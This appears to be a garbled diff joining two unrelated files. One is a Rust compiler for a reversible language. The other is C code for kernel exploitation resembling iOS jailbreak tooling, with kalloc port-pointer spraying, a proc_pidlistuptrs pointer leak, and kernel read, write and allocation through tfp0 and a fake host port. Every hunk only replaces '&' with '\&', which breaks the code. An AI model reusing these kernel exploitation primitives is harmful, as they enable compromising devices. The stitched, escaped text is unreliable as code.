@@ -73,36 +73,36 @@ impl Code {\n\
             b2f_links: Vec::new()\n\
         }\n\
     }\n\
-    pub fn link_fwd2bkwd(&mut self) {\n\
+    pub fn link_fwd2bkwd(\&mut self) {\n\
         self.f2b_links.push((self.fwd.len(), self.bkwd.len()));\n\
         // Insert dummy instruction //\n\
         self.fwd.push(Instruction::Reverse{idx: 0});\n\
     }\n\
-    pub fn link_bkwd2fwd(&mut self) {\n\
+    pub fn link_bkwd2fwd(\&mut self) {\n\
         self.b2f_links.push((self.bkwd.len(), self.fwd.len()));\n\
         // Insert dummy instruction //\n\
         self.bkwd.push(Instruction::Reverse{idx: 0});\n\
     }\n\
-    pub fn push_fwd(&mut self, x: Instruction) {\n\
+    pub fn push_fwd(\&mut self, x: Instruction) {\n\
         self.fwd.push(x);\n\
     }\n\
-    pub fn push_bkwd(&mut self, x: Instruction) {\n\
+    pub fn push_bkwd(\&mut self, x: Instruction) {\n\
         self.bkwd.push(x);\n\
     }\n\
-    pub fn append_fwd(&mut self, mut instructions: Vec<Instruction>) {\n\
-        self.fwd.append(&mut instructions);\n\
+    pub fn append_fwd(\&mut self, mut instructions: Vec<Instruction>) {\n\
+        self.fwd.append(\&mut instructions);\n\
     }\n\
     \n\
-    pub fn append_bkwd(&mut self, instructions: Vec<Instruction>) {\n\
+    pub fn append_bkwd(\&mut self, instructions: Vec<Instruction>) {\n\
         self.bkwd.extend(instructions.into_iter().rev());\n\
     }\n\
-    pub fn fwd_len(&mut self) -> usize {\n\
+    pub fn fwd_len(\&mut self) -> usize {\n\
         self.fwd.len()\n\
     }\n\
-    pub fn bkwd_len(&mut self) -> usize {\n\
+    pub fn bkwd_len(\&mut self) -> usize {\n\
         self.bkwd.len()\n\
     }\n\
-    pub fn extend(&mut self, other: Code) {\n\
+    pub fn extend(\&mut self, other: Code) {\n\
         let Code{fwd, bkwd, f2b_links, b2f_links} = other;\n\
         let (flen, blen) = (self.fwd.len(), self.bkwd.len());\n\
         self.fwd.extend(fwd);\n\
@@ -135,8 +135,8 @@ impl Code {\n\
     }\n\
 }\n\
 impl ST::ExpressionNode {\n\
-    pub fn compile(&self) -> Vec<Instruction> {\n\
-        match &self {\n\
+    pub fn compile(\&self) -> Vec<Instruction> {\n\
+        match \&self {\n\
             ST::ExpressionNode::FractionNode(valbox) => valbox.compile(),\n\
             ST::ExpressionNode::LookupNode(valbox) => valbox.compile(),\n\
             ST::ExpressionNode::BinopNode(valbox) => valbox.compile(),\n\
@@ -145,12 +145,12 @@ impl ST::ExpressionNode {\n\
     }\n\
 }\n\
 impl ST::FractionNode {\n\
-    pub fn compile(&self) -> Vec<Instruction> {\n\
+    pub fn compile(\&self) -> Vec<Instruction> {\n\
         vec![Instruction::LoadConst{idx: self.const_idx}]\n\
     }\n\
 }\n\
 impl ST::LookupNode {\n\
-    pub fn compile(&self) -> Vec<Instruction> {\n\
+    pub fn compile(\&self) -> Vec<Instruction> {\n\
         let mut instructions = Vec::with_capacity(self.indices.len()+1);        \n\
         for index in self.indices.iter().rev() {\n\
             instructions.extend(index.compile());\n\
@@ -163,7 +163,7 @@ impl ST::LookupNode {\n\
     }\n\
 }\n\
 impl ST::BinopNode {\n\
-    pub fn compile(&self) -> Vec<Instruction> {\n\
+    pub fn compile(\&self) -> Vec<Instruction> {\n\
         let mut ret = Vec::new();\n\
         ret.extend(self.lhs.compile());\n\
         ret.extend(self.rhs.compile());\n\
@@ -172,7 +172,7 @@ impl ST::BinopNode {\n\
     }\n\
 }\n\
 impl ST::ArrayLiteralNode {\n\
-    pub fn compile(&self) -> Vec<Instruction> {\n\
+    pub fn compile(\&self) -> Vec<Instruction> {\n\
         let mut ret = Vec::with_capacity(self.items.len() + 1);\n\
         for item in self.items.iter().rev() {\n\
             ret.extend(item.compile());\n\
@@ -182,7 +182,7 @@ impl ST::ArrayLiteralNode {\n\
     }\n\
 }\n\
 impl ST::StatementNode {\n\
-    pub fn compile(&self) -> Code {\n\
+    pub fn compile(\&self) -> Code {\n\
         match self {\n\
             ST::StatementNode::LetUnletNode(valbox) => valbox.compile(),\n\
             ST::StatementNode::RefUnrefNode(valbox) => valbox.compile(),\n\
@@ -194,7 +194,7 @@ impl ST::StatementNode {\n\
     }\n\
 }\n\
 impl ST::LetUnletNode {\n\
-    pub fn compile(&self) -> Code {\n\
+    pub fn compile(\&self) -> Code {\n\
         let mut code = Code::new();\n\
         if self.is_unlet {\n\
             code.push_fwd(Instruction::FreeRegister{register: self.register});\n\
@@ -211,7 +211,7 @@ impl ST::LetUnletNode {\n\
     }\n\
 }\n\
 impl ST::RefUnrefNode {\n\
-    pub fn compile(&self) -> Code {\n\
+    pub fn compile(\&self) -> Code {\n\
         let mut create_ref = self.rhs.compile();\n\
         create_ref.push(Instruction::StoreRegister{register: self.register});\n\
         let remove_ref = vec![Instruction::FreeRegister{register: self.register}];\n\
@@ -227,7 +227,7 @@ impl ST::RefUnrefNode {\n\
     }\n\
 }\n\
 impl ST::ModopNode {\n\
-    pub fn compile(&self) -> Code {\n\
+    pub fn compile(\&self) -> Code {\n\
         let lookup = self.lookup.compile();\n\
         let rhs = self.rhs.compile();\n\
         let bkwd_op = match self.op {\n\
@@ -254,7 +254,7 @@ impl ST::ModopNode {\n\
     }\n\
 }\n\
 impl ST::IfNode {\n\
-    pub fn compile(&self) -> Code {\n\
+    pub fn compile(\&self) -> Code {\n\
         let fwd_expr = self.fwd_expr.compile();\n\
         let bkwd_expr = self.bkwd_expr.compile();\n\
         let mut if_block = Code::new();\n\
@@ -288,7 +288,7 @@ impl ST::IfNode {\n\
     }\n\
 }\n\
 impl ST::CatchNode {\n\
-    pub fn compile(&self) -> Code {\n\
+    pub fn compile(\&self) -> Code {\n\
         let mut code = Code::new();\n\
         code.append_fwd(self.expr.compile());\n\
         code.push_fwd(Instruction::JumpIfFalse{delta: 1});\n\
@@ -297,9 +297,9 @@ impl ST::CatchNode {\n\
     }\n\
 }\n\
 impl ST::CallNode {\n\
-    pub fn compile(&self) -> Code {\n\
+    pub fn compile(\&self) -> Code {\n\
         let mut code = Code::new();\n\
-        for &register in self.stolen_args.iter().rev() {\n\
+        for \&register in self.stolen_args.iter().rev() {\n\
             code.push_fwd(Instruction::LoadRegister{register});\n\
             code.push_fwd(Instruction::FreeRegister{register});\n\
         }\n\
@@ -313,25 +313,25 @@ impl ST::CallNode {\n\
             code.push_fwd(Instruction::Call{idx: self.func_idx});\n\
             code.push_bkwd(Instruction::Uncall{idx: self.func_idx});\n\
         }\n\
-        for &register in self.return_args.iter().rev() {\n\
+        for \&register in self.return_args.iter().rev() {\n\
             code.push_fwd(Instruction::StoreRegister{register});\n\
         }\n\
         code\n\
     }\n\
 }\n\
 impl ST::FunctionNode {\n\
-    pub fn compile(&self) -> interpreter::Function {\n\
+    pub fn compile(\&self) -> interpreter::Function {\n\
         let mut code = Code::new();\n\
-        for &register in &self.borrow_registers {\n\
+        for \&register in \&self.borrow_registers {\n\
             code.push_fwd(Instruction::StoreRegister{register});\n\
         }\n\
-        for &register in &self.steal_registers {\n\
+        for \&register in \&self.steal_registers {\n\
             code.push_fwd(Instruction::StoreRegister{register});\n\
         }\n\
-        for stmt in &self.stmts {\n\
+        for stmt in \&self.stmts {\n\
             code.extend(stmt.compile());\n\
         }\n\
-        for &register in &self.return_registers {\n\
+        for \&register in \&self.return_registers {\n\
             code.push_fwd(Instruction::LoadRegister{register});\n\
         }\n\
         interpreter::Function{\n\
@@ -342,7 +342,7 @@ impl ST::FunctionNode {\n\
     }\n\
 }\n\
 impl ST::Module {\n\
-    pub fn compile(&self) -> interpreter::Module {\n\
+    pub fn compile(\&self) -> interpreter::Module {\n\
         interpreter::Module{\n\
             main_idx: self.main_idx,\n\
             functions: self.functions.iter()\n\
@@ -439,7 +439,7 @@ static mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int co
     // allocate a port to send the message to\n\
     mach_port_t q = MACH_PORT_NULL;\n\
     kern_return_t err;\n\
-    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);\n\
+    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, \&q);\n\
     if (err != KERN_SUCCESS) {\n\
         LOG(\"failed to allocate port\");\n\
         exit(EXIT_FAILURE);\n\
@@ -461,7 +461,7 @@ static mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int co
     msg->ool_ports.disposition = disposition;\n\
     msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;\n\
     msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;\n\
-    err = mach_msg(&msg->hdr,\n\
+    err = mach_msg(\&msg->hdr,\n\
         MACH_SEND_MSG | MACH_MSG_OPTION_NONE,\n\
         (mach_msg_size_t)sizeof(struct ool_msg),\n\
         0,\n\
@@ -499,7 +499,7 @@ uint64_t find_port_via_proc_pidlistuptrs_bug(mach_port_t port, int disposition)\
         //LOG(\"leaked %016llx\", leaked);\n\
         // a valid guess is one which looks a bit like a kernel heap pointer\n\
         // without the upper byte:\n\
-        if ((leaked < 0x00ffffff00000000) && (leaked > 0x00ffff0000000000)) {\n\
+        if ((leaked < 0x00ffffff00000000) \&\& (leaked > 0x00ffff0000000000)) {\n\
             guesses[valid_guesses++] = leaked | 0xff00000000000000;\n\
         }\n\
     }\n\
@@ -593,7 +593,7 @@ size_t kread(uint64_t where, void* p, size_t size)\n\
             where + offset,\n\
             chunk,\n\
             (mach_vm_address_t)p + offset,\n\
-            &sz);\n\
+            \&sz);\n\
         if (rv || sz == 0) {\n\
             LOG(\"error reading kernel @%p\", (void*)(offset + where));\n\
             break;\n\
@@ -643,7 +643,7 @@ void WriteKernel32(uint64_t kaddr, uint32_t val)\n\
         sleep(3);\n\
         return;\n\
     }\n\
-    wkbuffer(kaddr, &val, sizeof(val));\n\
+    wkbuffer(kaddr, \&val, sizeof(val));\n\
 }\n\
 void WriteKernel64(uint64_t kaddr, uint64_t val)\n\
 {\n\
@@ -652,7 +652,7 @@ void WriteKernel64(uint64_t kaddr, uint64_t val)\n\
         sleep(3);\n\
         return;\n\
     }\n\
-    wkbuffer(kaddr, &val, sizeof(val));\n\
+    wkbuffer(kaddr, \&val, sizeof(val));\n\
 }\n\
 uint32_t rk32_via_kmem_read_port(uint64_t kaddr)\n\
 {\n\
@@ -671,7 +671,7 @@ uint32_t rk32_via_kmem_read_port(uint64_t kaddr)\n\
     }\n\
     // now do the read:\n\
     uint32_t val = 0;\n\
-    err = pid_for_task(kmem_read_port, (int*)&val);\n\
+    err = pid_for_task(kmem_read_port, (int*)\&val);\n\
     if (err != KERN_SUCCESS) {\n\
         LOG(\"error calling pid_for_task %x %s\", err, mach_error_string(err));\n\
         sleep(10);\n\
@@ -682,7 +682,7 @@ uint32_t rk32_via_kmem_read_port(uint64_t kaddr)\n\
 uint32_t rk32_via_tfp0(uint64_t kaddr)\n\
 {\n\
     uint32_t val = 0;\n\
-    rkbuffer(kaddr, &val, sizeof(val));\n\
+    rkbuffer(kaddr, \&val, sizeof(val));\n\
     return val;\n\
 }\n\
 uint64_t rk64_via_kmem_read_port(uint64_t kaddr)\n\
@@ -695,7 +695,7 @@ uint64_t rk64_via_kmem_read_port(uint64_t kaddr)\n\
 uint64_t rk64_via_tfp0(uint64_t kaddr)\n\
 {\n\
     uint64_t val = 0;\n\
-    rkbuffer(kaddr, &val, sizeof(val));\n\
+    rkbuffer(kaddr, \&val, sizeof(val));\n\
     return val;\n\
 }\n\
 uint32_t ReadKernel32(uint64_t kaddr)\n\
@@ -743,7 +743,7 @@ uint64_t kmem_alloc(uint64_t size)\n\
     kern_return_t err;\n\
     mach_vm_address_t addr = 0;\n\
     mach_vm_size_t ksize = round_page_kernel(size);\n\
-    err = mach_vm_allocate(tfp0, &addr, ksize, VM_FLAGS_ANYWHERE);\n\
+    err = mach_vm_allocate(tfp0, \&addr, ksize, VM_FLAGS_ANYWHERE);\n\
     if (err != KERN_SUCCESS) {\n\
         LOG(\"unable to allocate kernel memory via tfp0: %s %x\", mach_error_string(err), err);\n\
         sleep(3);\n\
@@ -762,7 +762,7 @@ uint64_t kmem_alloc_wired(uint64_t size)\n\
     mach_vm_address_t addr = 0;\n\
     mach_vm_size_t ksize = round_page_kernel(size);\n\
     LOG(\"vm_kernel_page_size: %lx\", vm_kernel_page_size);\n\
-    err = mach_vm_allocate(tfp0, &addr, ksize + 0x4000, VM_FLAGS_ANYWHERE);\n\
+    err = mach_vm_allocate(tfp0, \&addr, ksize + 0x4000, VM_FLAGS_ANYWHERE);\n\
     if (err != KERN_SUCCESS) {\n\
         LOG(\"unable to allocate kernel memory via tfp0: %s %x\", mach_error_string(err), err);\n\
         sleep(3);\n\
@@ -770,7 +770,7 @@ uint64_t kmem_alloc_wired(uint64_t size)\n\
     }\n\
     LOG(\"allocated address: %llx\", addr);\n\
     addr += 0x3fff;\n\
-    addr &= ~0x3fffull;\n\
+    addr \&= ~0x3fffull;\n\
     LOG(\"address to wire: %llx\", addr);\n\
     err = mach_vm_wire(fake_host_priv(), tfp0, addr, ksize, VM_PROT_READ | VM_PROT_WRITE);\n\
     if (err != KERN_SUCCESS) {\n\
